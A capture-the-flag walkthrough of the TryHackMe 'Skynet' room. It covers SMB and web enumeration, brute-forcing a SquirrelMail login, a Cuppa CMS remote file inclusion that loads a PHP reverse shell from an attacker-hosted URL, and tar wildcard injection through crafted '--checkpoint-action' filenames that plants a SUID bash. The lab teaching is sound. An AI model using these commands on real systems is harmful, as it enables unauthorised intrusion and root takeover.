---
title: "TryHackMe - Skynet"
author: Nasrallah
description: ""
date: 2022-03-27 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, web, lfi, rfi, cronjob, wildcard, smb]
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello l33ts, I hope you are doing well. We are doing [Skynet](https://tryhackme.com/room/skynet) from [TryHackMe](https://tryhackme.com)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.96.15                                                                                                                             
Host is up (0.096s latency).                                                                                                                                 
Not shown: 994 closed tcp ports (reset)                                                                                                                      
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA PIPELINING UIDL AUTH-RESP-CODE TOP SASL RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: listed LOGINDISABLEDA0001 more post-login have capabilities Pre-login OK IMAP4rev1 IDLE ID SASL-IR ENABLE LITERAL+ LOGIN-REFERRALS
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h18m51s, deviation: 2h53m12s, median: -21m08s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-03-26T15:20:20
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-03-26T10:20:20-05:00
```

There are 5 open ports, let's start enumerating the webserver.

### WebServer

Let's navigate to the webpage `http://{target_IP}/`

![](/assets/img/tryhackme/skynet/Untitled.png)

We see what looks like search engine, nothing in the source code, let's do a directory enumeration.

### Gobuster

```Terminal
===============================================================
[+] Url:                     http://10.10.96.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/26 11:51:58 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/admin                (Status: 301) [Size: 310] [--> http://10.10.96.15/admin/]
/ai                   (Status: 301) [Size: 307] [--> http://10.10.96.15/ai/]   
/config               (Status: 301) [Size: 311] [--> http://10.10.96.15/config/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.96.15/css/]   
/js                   (Status: 301) [Size: 307] [--> http://10.10.96.15/js/]    
/server-status        (Status: 403) [Size: 276]                                 
/squirrelmail         (Status: 301) [Size: 317] [--> http://10.10.96.15/squirrelmail/]

===============================================================
```

We found the interesting directory **/squirrelmail**, let's navigate to it.

![](/assets/img/tryhackme/skynet/Untitled1.png)

It is a login page of SquirrelMail, since we don't have any credentials for that, let's continue our enumeration elsewhere.

### SMB

We can enumerate SMB using `enum4linux`, the commands is `enum4linux {target_IP}`

![](/assets/img/tryhackme/skynet/Untitled2.png)

From this scan, we found the username `milesdyson` and 2 interesting share; **anonymous** and **milesdyson**. To login to the SMB shares, we can use `smbclient`, the command would look like this:`sudo smbclient -N \\\\{target_IP}\\{share-name}`. -N options tells smbclient to login without a password.

![](/assets/img/tryhackme/skynet/Untitled3.png)

We can't access *milesdyson* share, but we can access *anonymous* share.

Inside the *anonymous* share, we found a **attention.txt** file and a **log1.txt**, we can download the two files using the command `get {filename}`. Let's see what's inside the two files.

![](/assets/img/tryhackme/skynet/Untitled4.png)

The **attention.txt** file has a note from *milesdyson* that says that the employees need to change their password due to a system malfunction, the **log1.txt** file contains what looks like a list of passwords.

We have a username and a list of passwords, let's brute force the login page of SquirrelMail and see if we can find the password. I used burp intruder to do the job, and i was able to find the password.

![](/assets/img/tryhackme/skynet/Untitled5.png)

To spot the working password, we can look at the length and the status code of the response, the real password has a different value compared to other passwords.

Let's try now login to the mail service.

![](/assets/img/tryhackme/skynet/Untitled6.png)

We managed to login successfully, and we can see milesdyson's emails, one of the emails has *samba password reset* as a subject, let's take a look at it.

![](/assets/img/tryhackme/skynet/Untitled7.png)

We find the password of smb, let's login to the milesdyson share with the user milesdyson.`sudo smbclient -U milesdyson \\\\{target_IP}\\milesdyson`

![](/assets/img/tryhackme/skynet/Untitled8.png)

We managed to login to milesdyson share, inside the share some pdf files and **notes** directory, let's see what's inside it.

![](/assets/img/tryhackme/skynet/Untitled9.png)

There are a lot pdf files, but there is an interesting file names **important.txt**, let's download it to our machine with `get important.txt` and take a look at it.

![](/assets/img/tryhackme/skynet/Untitled10.png)

The file revealed a web directory, let's navigate to it.

![](/assets/img/tryhackme/skynet/Untitled11.png)

It says it's Miles Dyson personal page, let's run a directory scan on it.

```Terminal
===============================================================
[+] Url:                     http://10.10.96.15/45kra24zxs28v3yd
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/26 12:34:18 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/administrator        (Status: 301) [Size: 335] [--> http://10.10.96.15/45kra24zxs28v3yd/administrator/]
/index.html           (Status: 200) [Size: 418]                                                         

===============================================================
```

We found **/administrator** directory, let's go to it.

![](/assets/img/tryhackme/skynet/Untitled12.png)

It's a login page of Cuppa CMS, i tried some knows credentials but it didn't work. Let's search if this cms has any vulnerabilities.

![](/assets/img/tryhackme/skynet/Untitled13.png)

Indeed, we found a Local/Remote File inclusion vulnerability. With this vulnerability, we can read file on the server and upload files and run them on the server. Let's see how to exploit this.


## **Foothold**

Let's navigate to the exploit we have found.

![](/assets/img/tryhackme/skynet/Untitled14.png)

The path of the vulnerability is `cuppa/alerts/alertConfigField.php?urlConfig=[FI]`, with the **urlConfig** we can either enter a path for a local file to read or a url that contains a file.

I setup a http server that has a php reverse shell code in it, i then setup a netcat listener on my machine and used the rfi path to server the php code.`http://{target_IP}/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://{attacker_ip}/reverse_shell.php`

![](/assets/img/tryhackme/skynet/Untitled15.png)

Great! We got a shell, i used python pty trick to stabilize my shell. Let's do some enumeration on the machine now.


## **Privilege Escalation**

Let's do some basic enumeration first.

![](/assets/img/tryhackme/skynet/Untitled16.png)

On milesdyson home directory a backups directory that has two files, *backup.sh* and *backup.tgz*. We can notice that **backup.tgz** has been modified very recently, the **backup.sh** file is readable so let's see what it does.

![](/assets/img/tryhackme/skynet/Untitled17.png)

The script takes a backup of **/var/www/html**, the webpage files, and put the backup where we saw it, and there is a cronjob that runs the script as root.

The thing we notice about **backup.sh** script is that it uses **wildcard**. I searched on google on how to exploit this and found this useful [article](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) that explains how to exploit the wildcard.

In my case, i changed the directory to **/var/www/html**, created a file named *shell.sh* with this command in it `cp /bin/bash /tmp/bash && chmod +s /tmp/bash`, this command puts a copy of /bin/bash in /tmp/bash and give it suid permission so that we can run it as root, after that i created the following two file with `echo "" > "--checkpoint-action=exec=sh shell.sh"` and `echo "" > --checkpoint=1`, and when the backup.sh script runs, it will execute our shell.sh script, and if we check the /tmp directory, we will be able to find the bash binary with suid permission.

![](/assets/img/tryhackme/skynet/root.png)

We can run `/tmp/bash -p` and get root.

---

Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .
